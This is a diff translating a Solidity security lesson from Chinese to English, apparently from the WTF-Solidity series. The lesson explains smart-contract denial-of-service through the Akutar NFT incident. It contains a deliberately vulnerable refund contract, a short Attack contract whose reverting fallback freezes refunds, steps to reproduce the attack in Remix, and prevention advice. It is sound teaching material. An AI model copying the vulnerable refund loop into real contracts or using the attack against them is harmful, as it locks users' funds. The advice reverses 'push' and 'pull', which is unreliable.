@@ -20,45 +20,46 @@ English translations by: [@to_22X](https://twitter.com/to_22X)
 
 ---
 
-这一讲，我们将介绍智能合约的拒绝服务（Denial of Service, DoS）漏洞，并介绍预防的方法。NFT 项目 Akutar 曾因为 DoS 漏洞损失 11,539 ETH，当时价值 3400 万美元。
+In this lesson, we will introduce the Denial of Service (DoS) vulnerability in smart contracts and discuss methods for prevention. The NFT project Akutar once suffered a loss of 11,539 ETH, worth $34 million at the time, due to a DoS vulnerability.
 
 ## DoS
 
-在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。
+In Web2, a Denial of Service (DoS) attack refers to the phenomenon of overwhelming a server with a large amount of junk or disruptive information, rendering it unable to serve legitimate users. In Web3, it refers to exploiting vulnerabilities that prevent a smart contract from functioning properly.
 
-在 2022 年 4 月，一个很火的 NFT 项目名为 Akutar，他们使用[荷兰拍卖](https://github.com/AmazingAng/WTF-Solidity/tree/main/35_DutchAuction)进行公开发行，筹集了 11,539.5 ETH，非常成功。之前持有他们社区 Pass 的参与者会得到 0.5 ETH 的退款，但是他们处理退款的时候，发现智能合约不能正常运行，全部资金被永远锁在了合约里。他们的智能合约有拒绝服务漏洞。
+In April 2022, a popular NFT project called Akutar raised 11,539.5 ETH through a Dutch auction for its public launch, achieving great success. Participants who held their community Pass were supposed to receive a refund of 0.5 ETH. However, when they attempted to process the refunds, they discovered that the smart contract was unable to function correctly, resulting in all funds being permanently locked in the contract. Their smart contract had a DoS vulnerability.
 
 ![](./img/S09-1.png)
 
-## 漏洞例子
+## Vulnerability Example
 
-下面我们学习一个简化了的 Akutar 合约，名字叫 `DoSGame`。这个合约逻辑很简单，游戏开始时，玩家们调用 `deposit()` 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，`refund()`函数被调用，将 ETH 依次退款给所有玩家。
+Now let's study a simplified version of the Akutar contract called `DoSGame`. This contract has a simple logic: when the game starts, players call the `deposit()` function to deposit funds into the contract, and the contract records the addresses of all players and their corresponding deposits. When the game ends, the `refund()` function is called to refund ETH to all players in sequence.
 
 ```solidity
 // SPDX-License-Identifier: MIT
+// english translation by 22X
 pragma solidity ^0.8.4;
 
-// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。
+// Game with DoS vulnerability, players deposit money and call refund to withdraw it after the game ends.
 contract DoSGame {
     bool public refundFinished;
     mapping(address => uint256) public balanceOf;
     address[] public players;
-
-    // 所有玩家存ETH到合约里
+    
+    // All players deposit ETH into the contract
     function deposit() external payable {
         require(!refundFinished, "Game Over");
         require(msg.value > 0, "Please donate ETH");
-        // 记录存款
+        // Record the deposit
         balanceOf[msg.sender] = msg.value;
-        // 记录玩家地址
+        // Record the player's address
         players.push(msg.sender);
     }
 
-    // 游戏结束，退款开始，所有玩家将依次收到退款
+    // Game ends, refund starts, all players receive refunds one by one
     function refund() external {
         require(!refundFinished, "Game Over");
         uint256 pLength = players.length;
-        // 通过循环给所有玩家退款
+        // Loop through all players to refund them
         for(uint256 i; i < pLength; i++){
             address player = players[i];
             uint256 refundETH = balanceOf[player];
@@ -75,22 +76,22 @@ contract DoSGame {
 }
 ```
 
-这里的漏洞在于，`refund()` 函数中利用循环退款的时候，是使用的 `call` 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。
+The vulnerability here lies in the `refund()` function, where a loop is used to refund the players using the `call` function, which triggers the fallback function of the target address. If the target address is a malicious contract and contains malicious logic in its fallback function, the refund process will not be executed properly.
 
 ```
 (bool success, ) = player.call{value: refundETH}("");
 ```
 
-下面我们写个攻击合约， `attack()` 函数中将调用 `DoSGame` 合约的 `deposit()` 存款并参与游戏；`fallback()` 回调函数将回退所有向该合约发送`ETH`的交易，对`DoSGame` 合约中的 DoS 漏洞进行了攻击，所有退款将不能正常进行，资金被锁在合约中，就像 Akutar 合约中的一万多枚 ETH 一样。
+Below, we write an attack contract where the `attack()` function calls the `deposit()` function of the `DoSGame` contract to deposit funds and participate in the game. The `fallback()` fallback function reverts all transactions sending ETH to this contract, attacking the DoS vulnerability in the `DoSGame` contract. As a result, all refunds cannot be executed properly, and the funds are locked in the contract, just like the over 11,000 ETH in the Akutar contract.
 
 ```solidity
 contract Attack {
-    // 退款时进行DoS攻击
+    // DoS attack during refund
     fallback() external payable{
         revert("DoS Attack!");
     }
 
-    // 参与DoS游戏并存款
+    // Participate in the DoS game and deposit
     function attack(address gameAddr) external payable {
         DoSGame dos = DoSGame(gameAddr);
         dos.deposit{value: msg.value}();
@@ -98,31 +99,31 @@ contract Attack {
 }
 ```
 
-## `Remix` 复现
+## Reproduce on `Remix`
 
-**1.** 部署 `DoSGame` 合约。
-**2.** 调用 `DoSGame` 合约的 `deposit()`，进行存款并参与游戏。
+**1.** Deploy the `DoSGame` contract.
+**2.** Call the `deposit()` function of the `DoSGame` contract to make a deposit and participate in the game.
 ![](./img/S09-2.png)
-**3.** 此时，如果游戏结束调用 `refund()` 退款的话是可以正常退款的。
+**3.** At this point, if the game is over and `refund()` is called, the refund will be executed successfully.
 ![](./img/S09-3.jpg)
-**3.** 重新部署 `DoSGame` 合约，并部署 `Attack` 合约。
-**4.** 调用 `Attack` 合约的 `attack()`，进行存款并参与游戏。
+**3.** Redeploy the `DoSGame` contract and deploy the `Attack` contract.
+**4.** Call the `attack()` function of the `Attack` contract to make a deposit and participate in the game.
 ![](./img/S09-4.jpg)
-**5.** 调用 `DoSGame` 合约`refund()`，进行退款，发现不能正常运行，攻击成功。
+**5.** Call the `refund()` function of the `DoSGame` contract to initiate a refund, but it fails to execute properly, indicating a successful attack.
 ![](./img/S09-5.jpg)
 
-## 预防方法
+## How to Prevent
 
-很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方：
+Many logic errors can lead to denial of service in smart contracts, so developers need to be extremely cautious when writing smart contracts. Here are some areas that require special attention:
 
-1. 外部合约的函数调用（例如 `call`）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 `require(success, "Refund Fail!");` 去掉，退款在单个地址失败时仍能继续运行。
-2. 合约不会出乎意料的自毁。
-3. 合约不会进入无限循环。
-4. `require` 和 `assert` 的参数设定正确。
-5. 退款时，让用户从合约自行领取（push），而非批量发送给用户(pull)。
-6. 确保回调函数不会影响正常合约运行。
-7. 确保当合约的参与者（例如 `owner`）永远缺席时，合约的主要业务仍能顺利运行。
+1. Failure of external contract function calls (e.g., `call`) should not result in the blocking of important functionality. For example, removing the `require(success, "Refund Fail!");` statement in the vulnerable contract allows the refund process to continue even if a single address fails.
+2. Contracts should not unexpectedly self-destruct.
+3. Contracts should not enter infinite loops.
+4. Parameters for `require` and `assert` should be set correctly.
+5. When refunding, allow users to claim funds from the contract (push) instead of sending funds to users in batch (pull).
+6. Ensure that callback functions do not interfere with the normal operation of the contract.
+7. Ensure that the main business of the contract can still function properly even when participants (e.g., `owner`) are absent.
 
-## 总结
+## Summary
 
-这一讲，我们介绍了智能合约的拒绝服务漏洞，Akutar 项目因为该漏洞损失了一万多枚ETH。很多逻辑错误都能导致DoS，开发者写智能合约时要万分谨慎，比如退款要让用户自行领取，而非合约批量发送给用户。
+In this lesson, we introduced the denial of service vulnerability in smart contracts, which caused the Akutar project to lose over 10,000 ETH. Many logic errors can lead to DoS attacks, so developers need to be extremely cautious when writing smart contracts. For example, refunds should be claimed by users individually instead of being sent in batch by the contract.
